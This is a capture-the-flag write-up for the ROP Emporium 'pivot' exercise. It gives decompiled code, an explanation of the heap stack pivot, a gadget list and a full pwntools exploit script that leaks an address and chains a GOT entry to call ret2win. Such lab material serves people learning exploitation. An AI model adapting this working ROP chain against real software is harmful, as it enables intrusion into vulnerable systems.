# Pivot

## Reversing with Ghidva

### main
```c
int main() {
  void *heapspace;
  
  puts("pivot by ROP Emporium");
  puts("x86_64\n");
  heapspace = malloc(0x1000000);
  
  if (heapspace == 0) {
    puts("Failed to request space for pivot stack");
    exit(1);
  }

  pwnme((void *)((long)heapspace + 0xffff00));
  free(heapspace);
  puts("\nExiting");
  return 0;
}
```

### pwnme
```c
void pwnme(void *heap) {
  char input[32];
  
  memset(input, 0, 0x20);
  puts("Call ret2win() from libpivot");
  printf("The Old Gods kindly bestow upon you a place to pivot: %p\n",heap);
  puts("Send a ROP chain now and it will land there");
  printf("> ");
  read(0, heap, 0x100);
  puts("Thank you!\n");
  puts("Now please send your stack smash");
  printf("> ");
  read(0, input, 0x40);
  puts("Thank you!");
}
```

### foothold_function
```c
void foothold_function() {
  puts("foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot");
}
```

### ret2win
```c
void ret2win() {
  FILE *file;
  char flag[40];
  
  file = fopen("flag.txt", "r");
  if (file == 0) {
    puts("Failed to open file: flag.txt");
    exit(1);
  }
  fgets(flag, 0x21, file);
  puts(flag);
  fclose(file);
  exit(0);
}
```


## The vuln
A `Buffer Overflow` allows us to perform a `ROP chain` using the `Heap` as pivot. By using the correct gadget is possible to perform a `return2lib` attack in order to execute the `ret2win` function.

Useful Gadgets:
```assembly
0x00000000004007c8: pop rbp; ret; 
0x0000000000400a33: pop rdi; ret;
0x00000000004009bb: pop rax; ret;
0x00000000004006b0: call rax;
0x00000000004009bd: xchg rax, rsp; ret;
0x00000000004009c0: mov rax, qword ptr [rax]; ret;
0x00000000004009c4: add rax, rbp; ret;
```

## The exploit
First we need to fill the `Heap` buffer which will be used to pivot the `ROPchain`, for this chain we are going to use the `GOT` entry for `foothold_function` and the offset between `foothold_function` and `ret2win`. We need to execute first `foothold_function`, in order to link the correct function from `libpivot`, then we can increment the correct address using the precalculated offset and call `ret2win`. To fill `Stack` buffer we have to use the provided leak and the gadgets `0x4009bd` which allows us to flip `rsp` and `rax` registers and the gadget `0x4007c8`. By moving the leaked address in `rsp` we're going to take the chain in the `Heap`.

## The script
```py
from pwn import *
import os

#
# Context
#

e = context.binary = ELF('pivot')

#
# Offset
#

io = process(e.path)
io.sendlineafter(b'> ', 'poop')
io.sendlineafter(b'> ', cyclic(0x100))
io.wait()
core = io.corefile
io.close()
offset = cyclic_find(core.read(core.rsp, 4))

info(f'Offset: {offset}')

#
# Library functions offset
#

lib = ELF('libpivot.so')

lib_ret2win  = lib.symbols['ret2win']
lib_foothold = lib.symbols['foothold_function']

rtw_offset = lib_ret2win - lib_foothold

info(f'Ret2Win offset: {rtw_offset}')

#
# ROP
#

FOOTHOLD_FUNCTION_GOT   = p64(e.got['foothold_function'])
EXIT                    = p64(e.symbols['exit'])

XCHG_RAX_RSP            = p64(next(e.search(asm('xchg rax, rsp; ret;'))))
DEREF_RAX               = p64(next(e.search(asm('mov rax, qword ptr [rax]; ret;'))))
ADD_RAX_RBP             = p64(next(e.search(asm('add rax, rbp; ret;'))))
POP_RAX                 = p64(next(e.search(asm('pop rax; ret;'))))
POP_RBP                 = p64(next(e.search(asm('pop rbp; ret;'))))
CALL_RAX                = p64(next(e.search(asm('call rax;'))))

#
# Exploit
#

io = process(e.path)

# Leak heap address
heap_leak = io.recvuntil(b'\nSend').decode().split('\n')[-2].split()[-1]
info(f'Heap Leak: {heap_leak}')
heap_leak = p64(int(heap_leak[2:], 16))

heap_payload  = b''

heap_payload += POP_RAX
heap_payload += FOOTHOLD_FUNCTION_GOT
heap_payload += DEREF_RAX
heap_payload += CALL_RAX
heap_payload += b'RBPDIOCA'

heap_payload += POP_RAX
heap_payload += FOOTHOLD_FUNCTION_GOT
heap_payload += DEREF_RAX
heap_payload += POP_RBP
heap_payload += p64(rtw_offset)
heap_payload += ADD_RAX_RBP
heap_payload += CALL_RAX
heap_payload += EXIT
heap_payload += EXIT
heap_payload += b'H' * (0x100 - len(heap_payload))

stack_payload  = b''
stack_payload += b'A' * offset

stack_payload += POP_RAX
stack_payload += heap_leak
stack_payload += XCHG_RAX_RSP

io.sendafter(b'> ', heap_payload)
io.sendafter(b'> ', stack_payload)

print(io.recvrepeat(1).decode())

os.system('rm core*')
```